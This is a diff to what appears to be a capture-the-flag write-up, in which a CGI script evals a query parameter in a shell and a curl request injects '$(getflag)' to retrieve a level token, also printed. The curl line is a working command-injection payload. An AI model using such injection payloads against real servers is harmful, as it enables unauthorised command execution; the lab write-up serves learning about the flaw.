@@ -6,7 +6,7 @@ the server is a http server that use GCI
 the script eval the shell command with the `x` parameter and echo back the result
 	print `echo $y 2>&1`;
 
-$> curl "localhost:4747?x=\$(getflag)"
+$> curl 'localhost:4747?x=$(getflag)'
 Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
 
-this token is the level04's password
+this token is the level05's password
